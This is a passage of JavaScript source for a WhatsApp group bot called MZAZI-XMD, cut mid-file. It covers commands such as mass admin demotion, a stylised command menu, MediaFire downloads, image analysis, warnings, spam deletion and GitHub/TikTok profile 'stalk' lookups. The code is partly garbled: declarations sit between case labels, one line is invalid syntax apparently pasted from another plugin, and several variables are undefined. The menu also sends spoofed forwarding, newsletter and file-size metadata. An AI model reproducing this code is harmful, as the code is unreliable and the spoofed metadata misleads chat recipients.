  const filename = `custom_${Date.now()}.hc`;

  await client.sendMessage(m.chat, {
    document: buffer,
    fileName: filename,
    mimetype: 'application/octet-stream',
    caption: `✅ *HTTP Custom Config Generated*\n\n• Host: ${host}\n• Port: ${port}\n• User: ${user}\n• SNI: ${sni}\n• Proxy: ${proxy || 'None'}`
  }, { quoted: m });
}
break;
	case 'demoteall': {
  const ownerJid = '254768640800@s.whatsapp.net'; // Replace with your own JID

  if (m.sender !== ownerJid) return reply('Only the bot owner can use this command.');

  const groupMetadata = await client.groupMetadata(m.chat);
  const participants = groupMetadata.participants;

  const bot = participants.find(p => p.id === client.user.id);
  if (!bot?.admin) return reply('I need to be admin to demote others.');

  const admins = participants.filter(p => p.admin && p.id !== client.user.id);

  if (!admins.length) return reply('No other admins to demote.');

  const demoteList = admins.map(p => p.id);
  await client.groupParticipantsUpdate(m.chat, demoteList, 'demote');

  reply(`✅ Demoted ${demoteList.length} admin(s).`);
  break;
}
   case 'tinyurl':
case 'short':
case 'acortar':
case 'corto': {
  if (!args[0]) return reply('*Please provide a URL or link to shorten.*');

  try {
    const res = await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`);
    const shortUrl = await res.text();

    if (!shortUrl || shortUrl.includes("Error")) {
      return reply('*Error: Could not generate a short URL.*');
    }

    const message = `*SHORT URL CREATED!!*\n\n*Original Link:*\n${args[0]}\n*Shortened URL:*\n${shortUrl}`;
    return reply(message);
  } catch (e) {
    console.error(e);
    return reply('*An error occurred while generating the short URL.*');
  }
}
break;
	


case 'menu':
case 'mzazi':
case 'commands': 
		      await mp3d ()
		      
const menuText = ` 
╭━━━[ *𝚳𝚭𝚫𝚭𝚰-𝚾𝚳𝐃* ]━━━╮
│ 𝗛𝗲𝘆 ${m.pushName}😁, ${getGreeting()}
╰━━━━━━━━━━━━━━━━━━━━━
👤 𝗨𝘀𝗲𝗿 : ${m.pushName}
🧑‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : ꪑɀꪖɀﺃ ꪀꫀꪻ ꪻꫀᥴꫝ ᛕꫀꪀꪗꪖ
😶 𝗣𝗿𝗲𝗳𝗶𝘅 : ${prefix}
📳 𝗠𝗼𝗱𝗲 : ${mode}
🔮 𝗦𝗽𝗲𝗲𝗱 :   ${dreadedspeed.toFixed(4)} 𝗠𝘀
⌚ 𝗧𝗶𝗺𝗲 : ${getCurrentTimeInNairobi()} on ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi'})}
💍 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗥𝗔𝗠 : 1.52𝗚𝗕 𝗼𝗳 6𝗚𝗕

╭─❒ 𝐒𝐔𝚸𝚸𝚯𝚪𝚻 𝚳𝚵𝚴𝐔
│⭔ 𝚂𝚄𝙿𝙿𝙾𝚁𝚃
│⭔ 𝙰𝙶𝙴𝙽𝚃𝚂
│⭔ 𝙰𝙼𝙱𝙰𝚂𝚂𝙰𝙳𝙾𝚁𝚂
╰❒

╭─❒ 𝐆𝚪𝚯𝐔𝚸 𝚳𝚵𝚴𝐔
│⭔ 𝙰𝙿𝙿𝚁𝙾𝚅𝙴
│⭔ 𝚁𝙴𝙹𝙴𝙲𝚃
│⭔ 𝙿𝚁𝙾𝙼𝙾𝚃𝙴
│⭔ 𝙳𝙴𝙼𝙾𝚃𝙴
│⭔ 𝙳𝙴𝙻𝙴𝚃𝙴
│⭔ 𝚁𝙴𝙼𝙾𝚅𝙴
│⭔ 𝙰𝙳𝙳
│⭔ 𝙵𝙰𝙺𝙴𝚁
│⭔ 𝙵𝙾𝚁𝙴𝙸𝙶𝙽𝙴𝚁𝚂
│⭔ 𝙲𝙻𝙾𝚂𝙴
│⭔ 𝙾𝙿𝙴𝙽
│⭔ 𝙲𝙻𝙾𝚂𝙴𝚃𝙸𝙼𝙴
│⭔ 𝙾𝙿𝙴𝙽𝚃𝙸𝙼𝙴
│⭔ 𝙳𝙸𝚂𝙿-𝙾𝙵𝙵
│⭔ 𝙳𝙸𝚂𝙿-1
│⭔ 𝙳𝙸𝚂𝙿-7
│⭔ 𝙳𝙸𝚂𝙿-90
│⭔ 𝙸𝙲𝙾𝙽
│⭔ 𝙶𝙲𝙿𝚁𝙾𝙵𝙸𝙻𝙴
│⭔ 𝚂𝚄𝙱𝙹𝙴𝙲𝚃
│⭔ 𝙳𝙴𝚂𝙲
│⭔ 𝙻𝙴𝙰𝚅𝙴
│⭔ 𝚃𝙰𝙶𝙰𝙻𝙻
│⭔ 𝙷𝙸𝙳𝙴𝚃𝙰𝙶
│⭔ 𝚁𝙴𝚅𝙾𝙺𝙴
│⭔ 𝙼𝚄𝚃𝙴
│⭔ 𝚄𝙽𝙼𝚄𝚃𝙴
│⭔ 𝙶𝚁𝙾𝚄𝙿𝙿𝙸𝙲 
╰❒

╭─❒ 𝚯𝐖𝚴𝚵𝚪 𝚳𝚵𝚴𝐔
│⭔ 𝚁𝙴𝚂𝚃𝙰𝚁𝚃
│⭔ 𝙰𝙳𝙼𝙸𝙽
│⭔ 𝙲𝙰𝚂𝚃
│⭔ 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃
│⭔ 𝙹𝙾𝙸𝙽
│⭔ 𝙶𝙴𝚃𝚅𝙰𝚁 
│⭔ 𝚁𝙴𝙳𝙴𝙿𝙻𝙾𝚈
│⭔ 𝚄𝙿𝙳𝙰𝚃𝙴
│⭔ 𝚂𝙴𝚃𝚅𝙰𝚁
│⭔ 𝙱𝙾𝚃𝙿𝙿
│⭔ 𝙵𝚄𝙻𝙻𝙿𝙿
│⭔ 𝙱𝙻𝙾𝙲𝙺
│⭔ 𝚄𝙽𝙱𝙻𝙾𝙲𝙺
│⭔ 𝙺𝙸𝙻𝙻
│⭔ 𝙺𝙸𝙻𝙻2
│⭔ 𝚃𝙴𝚁𝙼𝙸𝙽𝙰𝚃𝙴
│⭔ 𝚂𝙰𝚅𝙴
│⭔ >
│⭔ 𝚃𝙴𝙼𝙿𝙴𝙼𝙰𝙸𝙻
╰❒

╭─❒ 𝐅𝐔𝚴 𝚳𝚵𝚴𝐔
│⭔ 𝚅𝙸𝚁𝙶𝙸𝙽𝙸𝚃𝚈𝚃𝙴𝚂𝚃
│⭔ 𝚅𝙸𝚁𝙶𝙸𝙽𝙸𝚃𝚈𝚁𝙰𝚃𝙴
│⭔ 𝙵𝙾𝙾𝙻𝚃𝙴𝚂𝚃
│⭔ 𝙵𝙾𝙾𝙻𝚁𝙰𝚃𝙴
│⭔ 𝙷𝙾𝚁𝙽𝚈𝚃𝙴𝚂𝚃
│⭔ 𝙲𝙷𝙴𝙲𝙺𝙼𝙴
│⭔ 𝙲𝙷𝙴𝙲𝙺𝙰𝙻𝙻 
│⭔ 𝙵𝙻𝙸𝚁𝚃
╰❒

╭─❒ 𝐃𝚯𝐖𝚴𝐋𝚯𝚫𝐃 𝚳𝚵𝚴𝐔
│⭔ 𝚅𝙸𝙳𝙴𝙾
│⭔ 𝙿𝙻𝙰𝚈
│⭔ 𝙿𝙻𝙰𝚈2
│⭔ 𝚂𝙾𝙽𝙶
│⭔ 𝚂𝙾𝙽𝙶2
│⭔ 𝙵𝙱𝙳𝙻
│⭔ 𝚃𝙸𝙺𝚃𝙾𝙺
│⭔ 𝚃𝚆𝙸𝚃𝚃𝙴𝚁
│⭔ 𝚃𝚆𝚃𝙳𝙻
│⭔ 𝙸𝙶𝙳𝙻
│⭔ 𝙸𝙳
│⭔ 𝙵𝙱𝙳𝙻
│⭔ 𝙵𝙱
│⭔ 𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼
│⭔ 𝙼𝙾𝚅𝙸𝙴
│⭔ 𝙻𝚈𝚁𝙸𝙲𝚂
│⭔ 𝙻𝚈𝚁𝙸𝙲𝚂𝙱
│⭔ 𝚆𝙷𝙰𝚃𝚂𝙾𝙽𝙶
│⭔ 𝚈𝚃𝚂
│⭔ 𝚈𝚃𝙼𝙿3
│⭔ 𝚈𝚃𝙼𝙿4
╰❒

╭─❒ 𝚵𝐃𝚰𝚻 𝚳𝚵𝚴𝐔
│⭔ 𝚂𝚃𝙸𝙲𝙺𝙴𝚁
│⭔ 𝚂𝙼𝙴𝙼𝙴
│⭔ 𝙿𝙷𝙾𝚃𝙾
│⭔ 𝙼𝙿4
│⭔ 𝚁𝙴𝚃𝚁𝙸𝙴𝚅𝙴
│⭔ 𝚅𝚅
│⭔ 𝚅𝚅2
│⭔ 𝚆𝙰𝙷
│⭔ 𝚂𝙲𝚁𝙴𝙴𝙽𝚂𝙷𝙾𝚃
│⭔ 𝙼𝙸𝚇
│⭔ 𝚃𝙰𝙺𝙴
│⭔ 𝚃𝚆𝙴𝙴𝚃
│⭔ 𝚀𝚄𝙾𝚃𝙴𝙻𝚈
╰❒

╭─❒ 𝐂𝚯𝚴𝐅𝚰𝐆 𝛁𝚫𝚪 𝚳𝚵𝚴𝐔
│⭔ 𝙰𝙽𝚃𝙸𝙳𝙴𝙻𝙴𝚃𝙴
│⭔ 𝙰𝙽𝚃𝙸𝙲𝙰𝙻𝙻
│⭔ 𝙰𝙽𝚃𝙸𝙵𝙾𝚁𝙴𝙸𝙶𝙽
│⭔ 𝙰𝙽𝚃𝙸𝚃𝙰𝙶
│⭔ 𝙰𝙽𝚃𝙸𝙻𝙸𝙽𝙺
│⭔ 𝙰𝙽𝚃𝙸𝙻𝙸𝙽𝙺_𝙰𝙻𝙻
│⭔ 𝙶𝙿𝚃_𝙸𝙽𝙱𝙾𝚇
│⭔ 𝚆𝙴𝙻𝙲𝙾𝙼𝙴𝙶𝙾𝙾𝙳𝙱𝚈𝙴
╰❒

╭─❒ 𝐆𝚸𝚻 𝚫𝚴𝐃 𝚫𝚰 𝚳𝚵𝚴𝐔
│⭔ 𝙰𝙸
│⭔ 𝙰𝙸2
│⭔ 𝚅𝙸𝚂𝙸𝙾𝙽
│⭔ 𝚅𝙸𝚂𝙸𝙾𝙽2
│⭔ 𝙳𝙴𝙵𝙸𝙽𝙴
│⭔ 𝙳𝙰𝚁𝙺𝙶𝙿𝚃
│⭔ 𝙶𝙴𝙼𝙸𝙽𝙸
│⭔ 𝙶𝙾𝙾𝙶𝙻𝙴
│⭔ 𝙶𝙿𝚃
│⭔ 𝙶𝙿𝚃2
│⭔ 𝙶𝙿𝚃3
╰❒

╭─❒ 𝚫𝐔𝐃𝚰𝚯 𝚵𝐃𝚰𝚻 𝚳𝚵𝚴𝐔
│⭔ 𝙱𝙰𝚂𝚂
│⭔ 𝚂𝙻𝙾𝚆 
│⭔ 𝚅𝙾𝙻𝚄𝙼𝙴
│⭔ 𝙲𝚁𝚄𝚂𝙷
╰❒


╭─❒ 𝐒𝚻𝚫𝐋𝐊 𝚳𝚵𝚴𝐔
│⭔ 𝙶𝙸𝚃𝚂𝚃𝙰𝙻𝙺
│⭔ 𝚃𝚃𝚂𝚃𝙰𝙻𝙺
│⭔ 𝚃𝚆𝚂𝚃𝙰𝙻𝙺
│⭔ 𝚆𝙷𝚂𝚃𝙰𝙻𝙺
│⭔ 𝚈𝚃𝚂𝚃𝙰𝙻𝙺
╰❒


╭─❒ 𝐂𝚯𝐃𝚰𝚴𝐆 𝚳𝚵𝚴𝐔
│⭔ 𝙲𝙰𝚁𝙱𝙾𝙽
│⭔ 𝙲𝙾𝙼𝙿𝙸𝙻𝙴-𝙲
│⭔ 𝙲𝙾𝙼𝙿𝙸𝙻𝙴-𝙲++
│⭔ 𝙲𝙾𝙼𝙿𝙸𝙻𝙴-𝙹𝚂
│⭔ 𝙲𝙾𝙼𝙿𝙸𝙻𝙴-𝙿𝚈
│⭔ 𝙸𝙽𝚂𝙿𝙴𝙲𝚃
│⭔ 𝙴𝙽𝙲𝚁𝚈𝙿𝚃𝙴
│⭔ 𝙴𝙽𝙲-𝙷
│⭔ 𝙴𝙽𝙲
│⭔ 𝙴𝙽𝙲𝚁𝚈𝙿𝚃-𝙷
│⭔ 𝙴𝚅𝙰𝙻
╰❒

╭─❒ 𝐆𝚵𝚴𝚵𝚪𝚫𝐋 𝚳𝚵𝚴𝐔
│⭔ 𝙾𝚆𝙽𝙴𝚁
│⭔ 𝚂𝙲𝚁𝙸𝙿𝚃
│⭔ 𝚂𝙲
│⭔ 𝚁𝙴𝙿𝙾
│⭔ 𝙻𝙸𝚂𝚃
│⭔ 𝙿𝙸𝙽𝙶
│⭔ 𝙿𝙸𝙽𝙶2
│⭔ 𝙿𝙸𝙽𝙶3
│⭔ 𝙿𝙾𝙻𝙻
│⭔ 𝙰𝙻𝙸𝚅𝙴
│⭔ 𝚂𝙿𝙴𝙴𝙳
│⭔ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴
│⭔ 𝚄𝙿𝚃𝙸𝙼𝙴
│⭔ 𝙳𝙿
│⭔ 𝙳𝙸𝚃
│⭔ 𝙼𝙰𝙸𝙻
│⭔ 𝙸𝙽𝙱𝙾𝚇
│⭔ 𝙽𝙴𝚆𝚂
│⭔ 𝙰𝙽𝙸𝙼𝙴
╰❒

╭─❒ 𝚸𝚪𝚫𝚴𝐊 𝚳𝚵𝚴𝐔
│⭔ 𝙷𝙰𝙲𝙺
│⭔ 𝚅𝙸𝚁𝚄𝚂𝙷𝙰𝙲𝙺
╰❒

╭─❒ 𝐋𝚯𝐆𝚯 𝚳𝚵𝚴𝐔
│⭔ 𝙷𝙰𝙲𝙺𝙴𝚁
│⭔ 𝙷𝙰𝙲𝙺𝙴𝚁2
│⭔ 𝙶𝚁𝙰𝙵𝙵𝙸𝚃𝙸
│⭔ 𝙲𝙰𝚃
│⭔ 𝚂𝙰𝙽𝙳
│⭔ 𝙶𝙾𝙻𝙳
│⭔ 𝙰𝚁𝙴𝙽𝙰
│⭔ 𝙳𝚁𝙰𝙶𝙾𝙽𝙱𝙰𝙻𝙻
│⭔ 𝙽𝙰𝚁𝚄𝚃𝙾
│⭔ 𝙲𝙷𝙸𝙻𝙳
│⭔ 𝙻𝙴𝙰𝚅𝙴𝚂
│⭔ 1917
│⭔ 𝚃𝚈𝙿𝙾𝙶𝚁𝙰𝙿𝙷𝚈 
╰❒


╭─❒ 𝐋𝚯𝛁𝚵 𝚳𝚵𝚴𝐔
│⭔ 𝙻𝙾𝚅𝙴𝙻𝙴𝚃𝚃𝙴𝚁 𝚁𝙾𝙼𝙰𝙽𝚃𝙸𝙲
│⭔ 𝙻𝙾𝚅𝙴𝙻𝙴𝚃𝚃𝙴𝚁 𝙳𝙴𝙴𝙿
│⭔ 𝙻𝙾𝚅𝙴𝙻𝙴𝚃𝚃𝙴𝚁 𝙵𝚄𝙽𝙽𝚈
│⭔ 𝙻𝙾𝚅𝙴𝙻𝙴𝚃𝚃𝙴𝚁 𝙻𝙴𝚂𝙱𝙸𝙰𝙽
│⭔ 𝙻𝙾𝚅𝙴𝙻𝙴𝚃𝚃𝙴𝚁 𝙶𝙰𝚈
│⭔ 𝙻𝙾𝚅𝙴𝙻𝙴𝚃𝚃𝙴𝚁 𝙷𝙴𝙰𝚁𝚃𝙱𝚁𝙴𝙰𝙺
╰❒

╭─❒ 𝚻𝚵𝚾𝚻𝚳𝚫𝐊𝚵𝚪 𝚳𝚵𝚴𝐔
│⭔ 𝙿𝚄𝚁𝙿𝙻𝙴
│⭔ 𝙽𝙴𝙾𝙽
│⭔ 𝙽𝙾𝙴𝙻
│⭔ 𝙼𝙴𝚃𝙰𝙻𝙻𝙸𝙲
│⭔ 𝙳𝙴𝚅𝙸𝙻
│⭔ 𝙸𝙼𝙿𝚁𝙴𝚂𝚂𝙸𝚅𝙴
│⭔ 𝚂𝙽𝙾𝚆
│⭔ 𝚆𝙰𝚃𝙴𝚁
│⭔ 𝚃𝙷𝚄𝙽𝙳𝙴𝚁
│⭔ 𝙸𝙲𝙴
│⭔ 𝙼𝙰𝚃𝚁𝙸𝚇
│⭔ 𝚂𝙸𝙻𝚅𝙴𝚁
│⭔ 𝙻𝙸𝙶𝙷𝚃
╰❒

╭─❒ 𝚳𝚰𝐒𝐂 𝚳𝚵𝚴𝐔
│⭔ 𝚆𝙴𝙰𝚃𝙷𝙴𝚁
│⭔ 𝙶𝙸𝚃𝙷𝚄𝙱
│⭔ 𝙶𝙸𝚃𝙲𝙻𝙾𝙽𝙴
│⭔ 𝙰𝙳𝚅𝙸𝙲𝙴
│⭔ 𝚁𝙴𝙼𝙾𝚅𝙴𝙱𝙶
│⭔ 𝚁𝙴𝙼𝙸𝙽𝙸
│⭔ 𝚃𝚃𝚂
│⭔ 𝚃𝚁𝚃
│⭔ 𝙵𝙰𝙲𝚃 
│⭔ 𝙲𝙰𝚃𝙵𝙰𝙲𝚃
│⭔ 𝚀𝚄𝙾𝚃𝙴𝚂
│⭔ 𝙿𝙸𝙲𝙺𝚄𝙿𝙻𝙸𝙽𝙴
╰❒


╭─❒ 𝚯𝚻𝚮𝚵𝚪 𝚳𝚵𝚴𝐔
│⭔ 𝙲𝚁𝙴𝙳𝙸𝚃𝚂
│⭔ 𝚄𝙿𝙻𝙾𝙰𝙳
│⭔ 𝙰𝚃𝚃𝙿
│⭔ 𝚄𝚁𝙻
│⭔ 𝙸𝙼𝙰𝙶𝙴
│⭔ 𝚂𝚈𝚂𝚃𝙴𝙼
╰❒


𝛁𝚯𝚻𝚵 𝚯𝐅 𝚻𝚮𝚫𝚴𝐊𝐒 𝚻𝚯
> M̷Z̷A̷Z̷I̷ (𝖙𝖍𝖊 𝖇𝖔𝖙 𝖉𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗)
> N̷i̷c̷k̷y̷ (t̷𝖍𝖊 𝖇𝖆𝖘𝖊 𝖕𝖗𝖔𝖛𝖎𝖉𝖊𝖗)
> C̷y̷n̷t̷h̷i̷a̷ (𝕸𝖞 𝕷𝖔𝖛𝖊)

𝐅𝚪𝚰𝚵𝚴𝐃𝐒 𝚰𝚴𝐂𝐋𝐔𝐃𝚵:-
> 𝕵𝖚𝖓𝖎𝖔𝖗
> 𝕵𝖆𝖒𝖊𝖘
> 𝕳𝖆𝖗𝖗𝖞𝖐𝖊𝖓
> 𝕯𝖆𝖓 𝖐𝖍𝖆𝖓
> 𝕮𝖍𝖎𝖑𝖑 𝖌𝖚𝖞
> 𝕾𝖙𝖎𝖓𝖌𝖊𝖗
> 𝖅𝖊𝖐𝖊

𝑇𝛨𝛥𝛮𝛫𝑆 𝑇𝛩 𝛥𝐿𝐿 𝛭𝛧𝛥𝛧𝛪-𝛸𝛭𝐷 𝑈𝑆𝛯𝑅𝑆
`;

if (menu === 'VIDEO') {
    await client.sendMessage(m.chat, {
        video: fs.readFileSync('./Media/menu.mp4'),
        caption: cap,
        gifPlayback: true
    }, { quoted: m });

} else if (menu === 'TEXT') {
    await client.sendMessage(m.chat, {
        text: menuType
    }, { quoted: m });

} else if (menu === 'IMAGE') {
    await client.sendMessage(m.chat, {
        image: { url: 'https://i.imgur.com/A08nrWx.jpeg' },
        caption: cap,
        fileLength: 9999999999
    }, { quoted: m });

} else if (menu === 'LINK') {
    await client.sendMessage(m.chat, {
        text: menuText,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363404846707306@newsletter',
                newsletterName: 'MZAZI NET TECH KENYA',
                serverMessageId: -1
            },
            externalAdReply: {
                showAdAttribution: true,
                title: '@ 𝗠𝗭𝗔𝗭𝗜 𝗧𝗢 𝗧𝗛𝗘 𝗡𝗔𝗧𝗜𝗢𝗡',
                body: `${runtime(process.uptime())}\nTap to view`,
                thumbnail: fs.readFileSync('./Media/mzazi.jpg'),
                sourceUrl: 'https://whatsapp.com/channel/0029Vb7pEw24Crfinj6SfU2b',
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
break;
	
  case 'mediafire': {
  if (!text) return m.reply("Provide a MediaFire link.");

  try {
    const mediafireUrl = `https://api.dreaded.site/api/mediafiredl?url=${text}`;
    const data = await fetchJson(mediafireUrl);

    if (data.status !== 200 || !data.result || !data.result.link) {
      return m.reply("Unable to retrieve download link.");
    }

    await client.sendMessage(
      m.chat,
      {
        document: { url: data.result.link },
        fileName: data.result.filename,
        mimetype: data.result.mimetype
      },
      { quoted: m }
    );
  } catch (error) {
    m.reply("Download failed\n" + error);
  }

  break;
}
	case 'vision2': {
  const { Catbox } = require("node-catbox");
  const fs = require('fs-extra');
  const axios = require('axios');

  const catbox = new Catbox();

  const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;

  if (!quotedMessage?.imageMessage || !text) {
    return m.reply("Please quote an image and provide a question/text for analysis.\nExample: /vision What's in this image?");
  }

  try {
    // Download and upload image to Catbox
    const filePath = await client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
    const uploadResult = await catbox.uploadFile({ path: filePath });
    const imageUrl = uploadResult;

    // Cleanup
    await fs.unlink(filePath).catch(() => {});

    // Analyze image with question
    const apiUrl = `https://apis-keith.vercel.app/ai/gemini-vision?image=${encodeURIComponent(imageUrl)}&q=${encodeURIComponent(text)}`;
    const response = await axios.get(apiUrl);

    if (response.data.status && response.data.result) {
      return m.reply(`🔍 Vision Analysis:\n\n${response.data.result}\n\n🖼️ Image URL: ${imageUrl}`);
    } else {
      throw new Error("API response was not successful");
    }

  } catch (err) {
    console.error("Vision command error:", err);
    return m.reply(`❌ Error: ${err.message}`);
  }

  break;
}
   const canvacord = require("canvacord");

case 'wanted': {
  let cap = `Converted By ${botname}`;
  let img;
  let result;

  try {
    if (m.quoted) {
      try {
        img = await client.profilePictureUrl(m.quoted.sender, 'image');
      } catch {
        img = "https://telegra.ph/file/9521e9ee2fdbd0d6f4f1c.jpg";
      }
      result = await canvacord.Canvacord.wanted(img);
    } else if (args[0]) {
      const mentionedUser = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
      try {
        img = await client.profilePictureUrl(mentionedUser, 'image');
      } catch {
        img = 'https://telegra.ph/file/9521e9ee2fdbd0d6f4f1c.jpg';
      }
      result = await canvacord.Canvacord.wanted(img);
    } else {
      return m.reply("Please tag someone or reply to a user to generate a wanted poster.");
    }

    await client.sendMessage(m.chat, { image: result, caption: cap }, { quoted: m });

  } catch (e) {
    console.error(e);
    m.reply("Something went wrong while creating the wanted poster.");
  }
}
break;
	case 'fancy2': {
  if (!text) return m.reply('Please provide some text.\nExample: .fancy 2 Hello world');

  let num = parseInt(text.split(' ')[0]);
  let txt = text.split(' ').slice(1).join(' ');
  const fancy = require('./Mzazi/fancy.js'); // update with actual path to your fancy module

  if (isNaN(num)) {
    return m.reply(fancy.list(txt, fancy));
  }

  let selected = fancy[num];
  if (!selected) return m.reply('Invalid style number. Use `.fancy` without arguments to see available styles.');

  let styled = fancy.apply(selected, txt);
  m.reply(styled);
}
break;
//================================================================================================//
	case 'warn': {
  const { addUserWithWarnCount, getWarnCountByJID } = require('./Mzazi/warn.js'); // update path
  const user = m.quoted ? m.quoted.sender : m.mentionedJid[0] || m.sender;

  await addUserWithWarnCount(user);
  const count = await getWarnCountByJID(user);
  m.reply(`User @${user.split('@')[0]} has been warned. Total warnings: ${count}`, { mentions: [user] });
}
break;

case 'warnings': {
  const { getWarnCountByJID } = require('./Mzazi/warn.js');
  const user = m.quoted ? m.quoted.sender : m.mentionedJid[0] || m.sender;

  const count = await getWarnCountByJID(user);
  m.reply(`User @${user.split('@')[0]} has ${count} warning(s).`, { mentions: [user] });
}
break;

case 'resetwarn': {
  const { resetWarnCountByJID } = require('./Mzazi/warn.js');
  const user = m.quoted ? m.quoted.sender : m.mentionedJid[0];
  if (!user) return m.reply('Tag a user or reply to a message to reset warning.');

  await resetWarnCountByJID(user);
  m.reply(`Warning count for @${user.split('@')[0]} has been reset.`, { mentions: [user] });
}
break;
//===================================================≠======================================================//
case 'tempnumber': {
  const getTempNumber = require('./Mzazi/tempnumber.js'); // Update with the correct path
  getTempNumber({ client, m });
}
break;
//======≠==============================================================================================//
case 'readmore': {
  if (!text || !text.includes('|')) {
    return client.sendMessage(m.chat, {
      text: `Usage:\n${usedPrefix}readmore <top text>|<bottom text>`
    }, { quoted: m });
  }
  let [before, after] = text.split('|');
  before = before.trim();
  after = after.trim();

  const more = String.fromCharCode(8206);
  const readMore = more.repeat(4001);

  await client.sendMessage(m.chat, {
    text: before + readMore + after
  }, { quoted: m });
}
break;
//===========================================================================//
case 'country': {
  if (!text) {
    return client.sendMessage(m.chat, {
      text: '🌍 Please provide a name to analyze\nExample: *country John*'
    }, { quoted: m });
  }

  try {
    const apiUrl = `https://api.nationalize.io/?name=${encodeURIComponent(text)}`;
    const response = await fetch(apiUrl);
    if (!response.ok) throw new Error('API request failed');

    const data = await response.json();
    if (!data?.country?.length) {
      return client.sendMessage(m.chat, {
        text: `❌ No country data found for "${text}"`
      }, { quoted: m });
    }

    let output = `🌐 *Country Guesser*\n\n` +
                 `✍️ *Name:* ${data.name}\n\n` +
                 `📊 *Likely Nationalities:*\n`;

    data.country.slice(0, 5).forEach((c, index) => {
      output += `${index + 1}. ${getCountryName(c.country_id)} (${(c.probability * 100).toFixed(1)}%)\n`;
    });

    output += `\n╰────────────────────\n_Powered by nationalize.io_`;

    await client.sendMessage(m.chat, {
      text: output
    }, { quoted: m });

  } catch (error) {
    console.error('Country Guess Error:', error);
    const errorMessage = error.message.includes('API') 
      ? '⚠️ Failed to access nationality service'
      : '❌ Error processing your request';

    await client.sendMessage(m.chat, {
      text: errorMessage
    }, { quoted: m });
  }
}
break;
//=================================================================//
case 'delspam': {
  const args = text.trim().split(' ');
  const count = parseInt(args[1]);

  if (!isGroup) {
    return m.reply("❌ This command can only be used in groups.");
  }

  if (!isBotAdmin) {
    return m.reply("❌ I need to be an admin to delete messages.");
  }

  if (isNaN(count) || count < 1 || count > 50) {
    return m.reply("⚠️ Please provide a valid number between 1 and 50.\n\nExample: *.delspam 10*");
  }

  try {
    const messages = await client.fetchMessagesFromChat(m.chat, count);
    for (const msg of messages) {
      await client.sendMessage(m.chat, { delete: msg.key });
    }
    await m.reply(`✅ Successfully deleted ${count} recent messages.`);
  } catch (err) {
    console.error("Error deleting messages:", err);
    await m.reply("❌ Failed to delete messages. Make sure I have admin permission.");
  }

  break;
}
//==========================================================================//
let handler = async (m, { client, command });
    case 'flirt': {
      let shizokeys = 'shizo'
      let res = await fetch(`https://shizoapi.onrender.com/api/texts/flirt?apikey=${shizokeys}`)
      if (!res.ok) throw await res.text()
      let json = await res.json()
      let response = `${json.result}`
      client.sendMessage(m.chat, { text: response, mentions: [m.sender] }, { quoted: m })
      break
    }
  //===========================================================================================//
case 'gitstalk': {
  try {
    if (!text) return m.reply('Please provide a GitHub repository URL');

    const fetch = require("node-fetch");
    let repoUrl = text.trim();

    if (!repoUrl.includes('github.com')) {
      return m.reply('Please provide a valid GitHub repository URL');
    }

    repoUrl = repoUrl.replace('.git', '').replace(/\/$/, '');

    const apiUrl = `https://apis-keith.vercel.app/stalker/repostalk?url=${encodeURIComponent(repoUrl)}`;
    const response = await fetch(apiUrl);
    const data = await response.json();

    if (!data.status) {
      return m.reply("Failed to fetch repository. Please check the URL and try again.");
    }

    const repo = data.result.repo;
    const owner = data.result.owner;
    const features = data.result.features;
    const sizeInMB = (repo.size / 1024).toFixed(2);

    const formatDate = (dateString) => {
      const options = { year: 'numeric', month: 'long', day: 'numeric' };
      return new Date(dateString).toLocaleDateString(undefined, options);
    };

    const featureList = [
      features.hasIssues ? '• Issues: ✅' : '• Issues: ❌',
      features.hasProjects ? '• Projects: ✅' : '• Projects: ❌',
      features.hasWiki ? '• Wiki: ✅' : '• Wiki: ❌',
      features.hasPages ? '• Pages: ✅' : '• Pages: ❌',
      features.hasDownloads ? '• Downloads: ✅' : '• Downloads: ❌',
      features.isTemplate ? '• Template: ✅' : '• Template: ❌',
      features.allowForking ? '• Forking: ✅' : '• Forking: ❌'
    ].join('\n');

    const summary = `
🛠️ *GitHub Repository Info* 🛠️

📂 *Repository:* ${repo.fullName}
📝 *Description:* ${repo.description || 'No description'}
🌐 *URL:* ${repo.url}

📊 *Stats:*
⭐ *Stars:* ${repo.stars.toLocaleString()}
👀 *Watchers:* ${repo.watchers.toLocaleString()}
🍴 *Forks:* ${repo.forks.toLocaleString()}
🚩 *Issues:* ${repo.openIssues.toLocaleString()}
📦 *Size:* ${sizeInMB} MB
💻 *Language:* ${repo.language || 'Not specified'}
📜 *License:* ${repo.license?.name || 'None'}
🌿 *Default Branch:* ${repo.defaultBranch}
👁️ *Visibility:* ${repo.visibility}

📅 *Dates:*
🆕 *Created:* ${formatDate(repo.createdAt)}
🔄 *Updated:* ${formatDate(repo.updatedAt)}
⏩ *Pushed:* ${formatDate(repo.pushedAt)}

👤 *Owner:*
🔹 *Username:* ${owner.username}
🔹 *Profile:* ${owner.profileUrl}
🔹 *Type:* ${owner.type}

🔧 *Features:*
${featureList}

🔗 *Clone URLs:*
• HTTPS: \`${repo.cloneUrls.https}\`
• SSH: \`${repo.cloneUrls.ssh}\`
• Git: \`${repo.cloneUrls.git}\`
`.trim();

    await client.sendMessage(m.chat, {
      image: { url: owner.avatar },
      caption: summary
    }, { quoted: m });

  } catch (error) {
    console.error('GitHub repo stalk error:', error);
    m.reply("An error occurred while fetching repository information.");
  }
  break;
}
//============================================================================//
case 'ttstalk': {
  try {
    if (!text) return m.reply('Please provide a TikTok username to stalk');

    const fetch = require("node-fetch");
    const username = text.trim();

    const response = await fetch(`https://apis-keith.vercel.app/stalker/tiktok?user=${username}`);
    const data = await response.json();

    if (!data.status) {
      return m.reply("Failed to fetch TikTok profile. Maybe the user doesn't exist?");
    }

    const profile = data.result.profile;
    const stats = data.result.stats;
    const settings = data.result.settings;

    const summary = `
